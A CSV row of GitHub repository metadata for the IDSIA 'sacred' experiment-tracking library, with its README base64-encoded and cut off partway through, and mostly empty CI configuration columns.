name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'sacred',18302786,"b'Sacred is a tool to help you configure, organize, log and reproduce experiments developed at IDSIA.'",b'Python',97,2398,,2398,False,b'https://api.github.com/repos/IDSIA/sacred/forks',"U2FjcmVkCj09PT09PQoKICAgIHwgKkV2ZXJ5IGV4cGVyaW1lbnQgaXMgc2Fj
cmVkKgogICAgfCAqRXZlcnkgZXhwZXJpbWVudCBpcyBncmVhdCoKICAgIHwg
KklmIGFuIGV4cGVyaW1lbnQgaXMgd2FzdGVkKgogICAgfCAqR29kIGdldHMg
cXVpdGUgaXJhdGUqCgp8cHlwaXwgfHB5X3ZlcnNpb25zfCB8bGljZW5zZXwg
fHJ0ZmR8IHxkb2l8Cgp8YnVpbGR8IHxjb3ZlcmFnZXwgfGNvZGVfcXVhbGl0
eXwgfGJsYWNrfAoKCgoKU2FjcmVkIGlzIGEgdG9vbCB0byBoZWxwIHlvdSBj
b25maWd1cmUsIG9yZ2FuaXplLCBsb2cgYW5kIHJlcHJvZHVjZSBleHBlcmlt
ZW50cy4KSXQgaXMgZGVzaWduZWQgdG8gZG8gYWxsIHRoZSB0ZWRpb3VzIG92
ZXJoZWFkIHdvcmsgdGhhdCB5b3UgbmVlZCB0byBkbyBhcm91bmQKeW91ciBh
Y3R1YWwgZXhwZXJpbWVudCBpbiBvcmRlciB0bzoKCi0ga2VlcCB0cmFjayBv
ZiBhbGwgdGhlIHBhcmFtZXRlcnMgb2YgeW91ciBleHBlcmltZW50Ci0gZWFz
aWx5IHJ1biB5b3VyIGV4cGVyaW1lbnQgZm9yIGRpZmZlcmVudCBzZXR0aW5n
cwotIHNhdmUgY29uZmlndXJhdGlvbnMgZm9yIGluZGl2aWR1YWwgcnVucyBp
biBhIGRhdGFiYXNlCi0gcmVwcm9kdWNlIHlvdXIgcmVzdWx0cwoKU2FjcmVk
IGFjaGlldmVzIHRoaXMgdGhyb3VnaCB0aGUgZm9sbG93aW5nIG1haW4gbWVj
aGFuaXNtczoKCi0gICoqQ29uZmlnU2NvcGVzKiogQSB2ZXJ5IGNvbnZlbmll
bnQgd2F5IG9mIHRoZSBsb2NhbCB2YXJpYWJsZXMgaW4gYSBmdW5jdGlvbgog
ICB0byBkZWZpbmUgdGhlIHBhcmFtZXRlcnMgeW91ciBleHBlcmltZW50IHVz
ZXMuCi0gICoqQ29uZmlnIEluamVjdGlvbioqOiBZb3UgY2FuIGFjY2VzcyBh
bGwgcGFyYW1ldGVycyBvZiB5b3VyIGNvbmZpZ3VyYXRpb24KICAgZnJvbSBl
dmVyeSBmdW5jdGlvbi4gVGhleSBhcmUgYXV0b21hdGljYWxseSBpbmplY3Rl
ZCBieSBuYW1lLgotICAqKkNvbW1hbmQtbGluZSBpbnRlcmZhY2UqKjogWW91
IGdldCBhIHBvd2VyZnVsIGNvbW1hbmQtbGluZSBpbnRlcmZhY2UgZm9yIGVh
Y2gKICAgZXhwZXJpbWVudCB0aGF0IHlvdSBjYW4gdXNlIHRvIGNoYW5nZSBw
YXJhbWV0ZXJzIGFuZCBydW4gZGlmZmVyZW50IHZhcmlhbnRzLgotICAqKk9i
c2VydmVycyoqOiBTYWNyZWQgcHJvdmlkZXMgT2JzZXJ2ZXJzIHRoYXQgbG9n
IGFsbCBraW5kcyBvZiBpbmZvcm1hdGlvbgogICBhYm91dCB5b3VyIGV4cGVy
aW1lbnQsIGl0cyBkZXBlbmRlbmNpZXMsIHRoZSBjb25maWd1cmF0aW9uIHlv
dSB1c2VkLAogICB0aGUgbWFjaGluZSBpdCBpcyBydW4gb24sIGFuZCBvZiBj
b3Vyc2UgdGhlIHJlc3VsdC4gVGhlc2UgY2FuIGJlIHNhdmVkCiAgIHRvIGEg
TW9uZ29EQiwgZm9yIGVhc3kgYWNjZXNzIGxhdGVyLgotICAqKkF1dG9tYXRp
YyBzZWVkaW5nKiogaGVscHMgY29udHJvbGxpbmcgdGhlIHJhbmRvbW5lc3Mg
aW4geW91ciBleHBlcmltZW50cywKICAgc3VjaCB0aGF0IHRoZSByZXN1bHRz
IHJlbWFpbiByZXByb2R1Y2libGUuCgpFeGFtcGxlCi0tLS0tLS0KKy0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSst
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsK
fCAqKlNjcmlwdCB0byB0cmFpbiBhbiBTVk0gb24gdGhlIGlyaXMgZGF0YXNl
dCoqIHwgKipUaGUgc2FtZSBzY3JpcHQgYXMgYSBTYWNyZWQgZXhwZXJpbWVu
dCoqIHwKKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLSsKfCAuLiBjb2RlOjogcHl0aG9uICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIHwgLi4gY29kZTo6IHB5dGhvbiAgICAgICAgICAg
ICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIHwKfCAgZnJvbSBudW1weS5yYW5kb20g
aW1wb3J0IHBlcm11dGF0aW9uICAgICAgICAgIHwgICBmcm9tIG51bXB5LnJh
bmRvbSBpbXBvcnQgcGVybXV0YXRpb24gICAgIHwKfCAgZnJvbSBza2xlYXJu
IGltcG9ydCBzdm0sIGRhdGFzZXRzICAgICAgICAgICAgIHwgICBmcm9tIHNr
bGVhcm4gaW1wb3J0IHN2bSwgZGF0YXNldHMgICAgICAgIHwKfCAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICBm
cm9tIHNhY3JlZCBpbXBvcnQgRXhwZXJpbWVudCAgICAgICAgICAgIHwKfCAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IHwgICBleCA9IEV4cGVyaW1lbnQoJ2lyaXNfcmJmX3N2bScpICAgICAgICAg
IHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIHwgICBAZXguY29uZmlnICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIHwgICBkZWYgY2ZnKCk6ICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIHwKfCAgQyA9IDEuMCAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgIEMgPSAxLjAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgZ2FtbWEgPSAwLjcgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgIGdhbW1hID0g
MC43ICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwg
ICBAZXguYXV0b21haW4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwK
fCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIHwgICBkZWYgcnVuKEMsIGdhbW1hKTogICAgICAgICAgICAgICAgICAg
ICAgIHwKfCAgaXJpcyA9IGRhdGFzZXRzLmxvYWRfaXJpcygpICAgICAgICAg
ICAgICAgICAgIHwgICAgIGlyaXMgPSBkYXRhc2V0cy5sb2FkX2lyaXMoKSAg
ICAgICAgICAgIHwKfCAgcGVybSA9IHBlcm11dGF0aW9uKGlyaXMudGFyZ2V0
LnNpemUpICAgICAgICAgIHwgICAgIHBlciA9IHBlcm11dGF0aW9uKGlyaXMu
dGFyZ2V0LnNpemUpICAgIHwKfCAgaXJpcy5kYXRhID0gaXJpcy5kYXRhW3Bl
cm1dICAgICAgICAgICAgICAgICAgIHwgICAgIGlyaXMuZGF0YSA9IGlyaXMu
ZGF0YVtwZXJdICAgICAgICAgICAgIHwKfCAgaXJpcy50YXJnZXQgPSBpcmlz
LnRhcmdldFtwZXJtXSAgICAgICAgICAgICAgIHwgICAgIGlyaXMudGFyZ2V0
ID0gaXJpcy50YXJnZXRbcGVyXSAgICAgICAgIHwKfCAgY2xmID0gc3ZtLlNW
QyhDLCAncmJmJywgZ2FtbWE9Z2FtbWEpICAgICAgICAgIHwgICAgIGNsZiA9
IHN2bS5TVkMoQywgJ3JiZicsIGdhbW1hPWdhbW1hKSAgIHwKfCAgY2xmLmZp
dChpcmlzLmRhdGFbOjkwXSwgICAgICAgICAgICAgICAgICAgICAgIHwgICAg
IGNsZi5maXQoaXJpcy5kYXRhWzo5MF0sICAgICAgICAgICAgICAgIHwKfCAg
ICAgICAgICBpcmlzLnRhcmdldFs6OTBdKSAgICAgICAgICAgICAgICAgICAg
IHwgICAgICAgICAgICAgaXJpcy50YXJnZXRbOjkwXSkgICAgICAgICAgICAg
IHwKfCAgcHJpbnQoY2xmLnNjb3JlKGlyaXMuZGF0YVs5MDpdLCAgICAgICAg
ICAgICAgIHwgICAgIHJldHVybiBjbGYuc2NvcmUoaXJpcy5kYXRhWzkwOl0s
ICAgICAgIHwKfCAgICAgICAgICAgICAgICAgIGlyaXMudGFyZ2V0WzkwOl0p
KSAgICAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgaXJpcy50YXJn
ZXRbOTA6XSkgICAgIHwKKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLSsKCkRvY3VtZW50YXRpb24KLS0tLS0tLS0t
LS0tLQpUaGUgZG9jdW1lbnRhdGlvbiBpcyBob3N0ZWQgYXQgYFJlYWRUaGVE
b2NzIDxodHRwOi8vc2FjcmVkLnJlYWR0aGVkb2NzLm9yZy8+YF8uCgpJbnN0
YWxsaW5nCi0tLS0tLS0tLS0KWW91IGNhbiBkaXJlY3RseSBpbnN0YWxsIGl0
IGZyb20gdGhlIFB5dGhvbiBQYWNrYWdlIEluZGV4IHdpdGggcGlwOgoKICAg
IHBpcCBpbnN0YWxsIHNhY3JlZAoKT3IgaWYgeW91IHdhbnQgdG8gZG8gaXQg
bWFudWFsbHkgeW91IGNhbiBjaGVja291dCB0aGUgY3VycmVudCB2ZXJzaW9u
IGZyb20gZ2l0CmFuZCBpbnN0YWxsIGl0IHlvdXJzZWxmOgoKICAgfCBnaXQg
Y2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL0lEU0lBL3NhY3JlZC5naXQKICAg
fCBjZCBzYWNyZWQKICAgfCBweXRob24gc2V0dXAucHkgaW5zdGFsbAoKWW91
IG1pZ2h0IHdhbnQgdG8gYWxzbyBpbnN0YWxsIHRoZSBgYG51bXB5YGAgYW5k
IHRoZSBgYHB5bW9uZ29gYCBwYWNrYWdlcy4gVGhleSBhcmUKb3B0aW9uYWwg
ZGVwZW5kZW5jaWVzIGJ1dCB0aGV5IG9mZmVyIHNvbWUgY29vbCBmZWF0dXJl
czoKCiAgICBwaXAgaW5zdGFsbCBudW1weSwgcHltb25nbwoKVGVzdHMKLS0t
LS0KVGhlIHRlc3RzIGZvciBzYWNyZWQgdXNlIHRoZSBgcHl0ZXN0IDxodHRw
Oi8vcHl0ZXN0Lm9yZy9sYXRlc3QvPmBfIHBhY2thZ2UuCllvdSBjYW4gZXhl
Y3V0ZSB0aGVtIGJ5IHJ1bm5pbmcgYGBweXRlc3RgYCBpbiB0aGUgc2FjcmVk
IGRpcmVjdG9yeSBsaWtlIHRoaXM6CgogICAgcHl0ZXN0CgpUaGVyZSBpcyBh
bHNvIGEgY29uZmlnIGZpbGUgZm9yIGB0b3ggPGh0dHBzOi8vdG94LnJlYWR0
aGVkb2NzLmlvL2VuL2xhdGVzdC8+YF8gc28geW91CmNhbiBhdXRvbWF0aWNh
bGx5IHJ1biB0aGUgdGVzdHMgZm9yIHZhcmlvdXMgcHl0aG9uIHZlcnNpb25z
IGxpa2UgdGhpczoKCiAgICB0b3gKCkNvbnRyaWJ1dGluZwotLS0tLS0tLS0t
LS0KSWYgeW91IGZpbmQgYSBidWcsIGhhdmUgYSBmZWF0dXJlIHJlcXVlc3Qg
b3Igd2FudCB0byBkaXNjdXNzIHNvbWV0aGluZyBnZW5lcmFsIHlvdSBhcmUg
d2VsY29tZSB0byBvcGVuIGFuCmBpc3N1ZSA8aHR0cHM6Ly9naXRodWIuY29t
L0lEU0lBL3NhY3JlZC9pc3N1ZXM+YF8uIElmIHlvdSBoYXZlIGEgc3BlY2lm
aWMgcXVlc3Rpb24gcmVsYXRlZAp0byB0aGUgdXNhZ2Ugb2Ygc2FjcmVkLCBw
bGVhc2UgYXNrIGEgcXVlc3Rpb24gb24gU3RhY2tPdmVyZmxvdyB1bmRlciB0
aGUKYHB5dGhvbi1zYWNyZWQgdGFnIDxodHRwczovL3N0YWNrb3ZlcmZsb3cu
Y29tL3F1ZXN0aW9ucy90YWdnZWQvcHl0aG9uLXNhY3JlZD5gXy4gV2UgdmFs
dWUgZG9jdW1lbnRhdGlvbgphIGxvdC4gSWYgeW91IGZpbmQgc29tZXRoaW5n
IHRoYXQgc2hvdWxkIGJlIGluY2x1ZGVkIGluIHRoZSBkb2N1bWVudGF0aW9u
IHBsZWFzZQpkb2N1bWVudCBpdCBvciBsZXQgdXMga25vdyB3aGF0cyBtaXNz
aW5nLiBJZiB5b3UgYXJlIHVzaW5nIFNhY3JlZCBpbiBvbmUgb2YgeW91ciBw
cm9qZWN0cyBhbmQgd2FudCB0byBzaGFyZQp5b3VyIGNvZGUgd2l0aCBvdGhl
cnMsIHB1dCB5b3VyIHJlcG8gaW4gdGhlIGBQcm9qZWN0cyB1c2luZyBTYWNy
ZWQgPGRvY3MvcHJvamVjdHNfdXNpbmdfc2FjcmVkLnJzdGA+XyBsaXN0LgpQ
dWxsIHJlcXVlc3RzIGFyZSBoaWdobHkgd2VsY29tZSEKCkZyb250ZW5kcwot
LS0tLS0tLS0KQXQgdGhpcyBwb2ludCB0aGVyZSBhcmUgdGhyZWUgZnJvbnRl
bmRzIHRvIHRoZSBkYXRhYmFzZSBlbnRyaWVzIGNyZWF0ZWQgYnkgc2FjcmVk
ICh0aGF0IEknbSBhd2FyZSBvZikuClRoZXkgYXJlIGRldmVsb3BlZCBleHRl
cm5hbGx5IGFzIHNlcGFyYXRlIHByb2plY3RzLgoKYE9tbmlib2FyZCA8aHR0
cHM6Ly9naXRodWIuY29tL3ZpdmVrcmF0bmF2ZWwvb21uaWJvYXJkPmBfCisr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKwouLiBpbWFnZTo6IGRvY3MvaW1hZ2VzL29tbmlib2FyZC10
YWJsZS5wbmcKLi4gaW1hZ2U6OiBkb2NzL2ltYWdlcy9vbW5pYm9hcmQtbWV0
cmljLWdyYXBocy5wbmcKCk9tbmlib2FyZCBpcyBhIHdlYiBkYXNoYm9hcmQg
dGhhdCBoZWxwcyBpbiB2aXN1YWxpemluZyB0aGUgZXhwZXJpbWVudHMgYW5k
IG1ldHJpY3MgLyBsb2dzIGNvbGxlY3RlZCBieSBzYWNyZWQuCk9tbmlib2Fy
ZCBpcyB3cml0dGVuIHdpdGggUmVhY3QsIE5vZGUuanMsIEV4cHJlc3MgYW5k
IEJvb3RzdHJhcC4KCgpgSW5jZW5zZSA8aHR0cHM6Ly9naXRodWIuY29tL0ph
cm5vUkZCL2luY2Vuc2U+YF8KKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrCi4uIGltYWdlOjogZG9j
cy9pbWFnZXMvaW5jZW5zZS1hcnRpZmFjdC5wbmcKLi4gaW1hZ2U6OiBkb2Nz
L2ltYWdlcy9pbmNlbnNlLW1ldHJpYy5wbmcKCkluY2Vuc2UgaXMgYSBQeXRo
b24gbGlicmFyeSB0byByZXRyaWV2ZSBydW5zIHN0b3JlZCBpbiBhIE1vbmdv
REIgYW5kIGludGVyYWN0aXZlbHkgZGlzcGxheSBtZXRyaWNzIGFuZCBhcnRp
ZmFjdHMKaW4gSnVweXRlciBub3RlYm9va3MuCgpgU2FjcmVkYm9hcmQgPGh0
dHBzOi8vZ2l0aHViLmNvbS9jaG92YW5lY20vc2FjcmVkYm9hcmQ+YF8KKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrCi4uIGltYWdlOjogZG9jcy9pbWFnZXMvc2FjcmVkYm9hcmQu
cG5nCgpTYWNyZWRib2FyZCBpcyBhIHdlYi1iYXNlZCBkYXNoYm9hcmQgaW50
ZXJmYWNlIHRvIHRoZSBzYWNyZWQgcnVucyBzdG9yZWQgaW4gYQpNb25nb0RC
LgoKYE5lcHR1bmUgPGh0dHBzOi8vbmVwdHVuZS5tbC8+YF8KKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrCi4uIGltYWdlOjogZG9jcy9pbWFnZXMvbmVwdHVuZS1jb21wYXJlLnBu
ZwouLiBpbWFnZTo6IGRvY3MvaW1hZ2VzL25lcHR1bmUtY29sbGFib3JhdGlv
bi5wbmcKCk5lcHR1bmUgaXMgYSB3ZWIgc2VydmljZSB0aGF0IGxldHMgeW91
IHZpc3VhbGl6ZSwgb3JnYW5pemUgYW5kIGNvbXBhcmUgeW91ciBleHBlcmlt
ZW50IHJ1bnMuCk9uY2UgdGhpbmdzIGFyZSBsb2dnZWQgdG8gTmVwdHVuZSB5
b3UgY2FuIHNoYXJlIGl0IHdpdGggb3RoZXJzLCBhZGQgY29tbWVudHMgYW5k
IGV2ZW4gYWNjZXNzIG9iamVjdHMgdmlhCmV4cGVyaW1lbnQgQVBJOgoKLi4g
aW1hZ2U6OiBkb2NzL2ltYWdlcy9uZXB0dW5lLXF1ZXJ5LWFwaS5wbmcKCklu
IG9yZGVyIHRvIGxvZyB5b3VyIHJ1bnMgdG8gTmVwdHVuZSwgYWxsIHlvdSBu
ZWVkIHRvIGRvIGlzIGFkZCBhbiBvYnNlcnZlcjoKCi4uIGNvZGUtYmxvY2s6
OiBweXRob24KCiAgICBmcm9tIG5lcHR1bmVjb250cmliLm1vbml0b3Jpbmcu
c2FjcmVkIGltcG9ydCBOZXB0dW5lT2JzZXJ2ZXIKICAgIGV4Lm9ic2VydmVy
cy5hcHBlbmQoTmVwdHVuZU9ic2VydmVyKGFwaV90b2tlbj0nWU9VUl9BUElf
VE9LRU4nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgcHJvamVjdF9uYW1lPSdVU0VSX05BTUUvUFJPSkVDVF9OQU1FJykpCgpG
b3IgbW9yZSBpbmZvLCBjaGVjayB0aGUgYG5lcHR1bmUtY29udHJpYiBsaWJy
YXJ5IDxodHRwczovL25lcHR1bmUtY29udHJpYi5yZWFkdGhlZG9jcy5pby9l
eGFtcGxlcy9vYnNlcnZlcl9zYWNyZWQuaHRtbD5gXy4KCmBTYWNyZWRCcm93
c2VyIDxodHRwczovL2dpdGh1Yi5jb20vbWljaGFlbHdhbmQvU2FjcmVkQnJv
d3Nlcj5gXworKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysKLi4gaW1hZ2U6OiBkb2NzL2lt
YWdlcy9zYWNyZWRfYnJvd3Nlci5wbmcKClNhY3JlZEJyb3dzZXIgaXMgYSBQ
eVF0NCBhcHBsaWNhdGlvbiB0byBicm93c2UgdGhlIE1vbmdvREIgZW50cmll
cyBjcmVhdGVkIGJ5CnNhY3JlZCBleHBlcmltZW50cy4KRmVhdHVyZXMgaW5j
bHVkZSBjdXN0b20gcXVlcmllcywgc29ydGluZyBvZiB0aGUgcmVzdWx0cywK
YWNjZXNzIHRvIHRoZSBzdG9yZWQgc291cmNlLWNvZGUsIGFuZCBtYW55IG1v
cmUuCk5vIGluc3RhbGxhdGlvbiBpcyByZXF1aXJlZCBhbmQgaXQgY2FuIGNv
bm5lY3QgdG8gYSBsb2NhbApkYXRhYmFzZSBvciBvdmVyIHRoZSBuZXR3b3Jr
LgoKCmBQcm9waGV0IDxodHRwczovL2dpdGh1Yi5jb20vUXdsb3VzZS9wcm9w
aGV0PmBfCisrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrClByb3BoZXQgaXMgYW4gZWFybHkgcHJvdG90eXBlIG9mIGEg
d2ViaW50ZXJmYWNlIHRvIHRoZSBNb25nb0RCIGVudHJpZXMgY3JlYXRlZCBi
eQpzYWNyZWQgZXhwZXJpbWVudHMsIHRoYXQgaXMgZGlzY29udGludWVkLgpJ
dCByZXF1aXJlcyB5b3UgdG8gcnVuIGBSZXN0SGVhcnQgPGh0dHA6Ly9yZXN0
aGVhcnQub3JnPmBfIHRvIGFjY2VzcyB0aGUgZGF0YWJhc2UuCgoKUmVsYXRl
ZCBQcm9qZWN0cwotLS0tLS0tLS0tLS0tLS0tCgpgU3VtYXRyYSA8aHR0cHM6
Ly9weXRob25ob3N0ZWQub3JnL1N1bWF0cmEvPmBfCisrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysKICAgfCBTdW1hdHJh
IGlzIGEgdG9vbCBmb3IgbWFuYWdpbmcgYW5kIHRyYWNraW5nIHByb2plY3Rz
IGJhc2VkIG9uIG51bWVyaWNhbAogICB8IHNpbXVsYXRpb24gYW5kL29yIGFu
YWx5c2lzLCB3aXRoIHRoZSBhaW0gb2Ygc3VwcG9ydGluZyByZXByb2R1Y2li
bGUgcmVzZWFyY2guCiAgIHwgSXQgY2FuIGJlIHRob3VnaHQgb2YgYXMgYW4g
YXV0b21hdGVkIGVsZWN0cm9uaWMgbGFiIG5vdGVib29rIGZvcgogICB8IGNv
bXB1dGF0aW9uYWwgcHJvamVjdHMuCgpTdW1hdHJhIHRha2VzIGEgZGlmZmVy
ZW50IGFwcHJvYWNoIGJ5IHByb3ZpZGluZyBjb21tYW5kbGluZSB0b29scyB0
byBpbml0aWFsaXplCmEgcHJvamVjdCBhbmQgdGhlbiBydW4gYXJiaXRyYXJ5
IGNvZGUgKG5vdCBqdXN0IHB5dGhvbikuCkl0IHRyYWNrcyBpbmZvcm1hdGlv
biBhYm91dCBhbGwgcnVucyBpbiBhIFNRTCBkYXRhYmFzZSBhbmQgZXZlbiBw
cm92aWRlcyBhIG5pY2UgYnJvd3NlciB0b29sLgpJdCBpbnRlZ3JhdGVzIGxl
c3MgdGlnaHRseSB3aXRoIHRoZSBjb2RlIHRvIGJlIHJ1biwgd2hpY2ggbWFr
ZXMgaXQgZWFzaWx5CmFwcGxpY2FibGUgdG8gbm9uLXB5dGhvbiBleHBlcmlt
ZW50cy4KQnV0IHRoYXQgYWxzbyBtZWFucyBpdCByZXF1aXJlcyBtb3JlIHNl
dHVwIGZvciBlYWNoIGV4cGVyaW1lbnQgYW5kCmNvbmZpZ3VyYXRpb24gbmVl
ZHMgdG8gYmUgZG9uZSB1c2luZyBmaWxlcy4KVXNlIHRoaXMgcHJvamVjdCBp
ZiB5b3UgbmVlZCB0byBydW4gbm9uLXB5dGhvbiBleHBlcmltZW50cywgb3Ig
YXJlIG9rIHdpdGggdGhlIGFkZGl0aW9uYWwgc2V0dXAvY29uZmlndXJhdGlv
biBvdmVyaGVhZC4KCgpgRnV0dXJlIEdhZGdldCBMYWJvcmF0b3J5IDxodHRw
czovL2dpdGh1Yi5jb20vS2FpeGhpbi9GR0xhYj5gXworKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKwogICB8IEZHTGFiIGlzIGEgbWFjaGluZSBsZWFybmluZyBkYXNoYm9h
cmQsIGRlc2lnbmVkIHRvIG1ha2UgcHJvdG90eXBpbmcKICAgfCBleHBlcmlt
ZW50cyBlYXNpZXIuIEV4cGVyaW1lbnQgZGV0YWlscyBhbmQgcmVzdWx0cyBh
cmUgc2VudCB0byBhIGRhdGFiYXNlLAogICB8IHdoaWNoIGFsbG93cyBhbmFs
eXRpY3MgdG8gYmUgcGVyZm9ybWVkIGFmdGVyIHRoZWlyIGNvbXBsZXRpb24u
IFRoZSBzZXJ2ZXIKICAgfCBpcyBGR0xhYiwgYW5kIHRoZSBjbGllbnRzIGFy
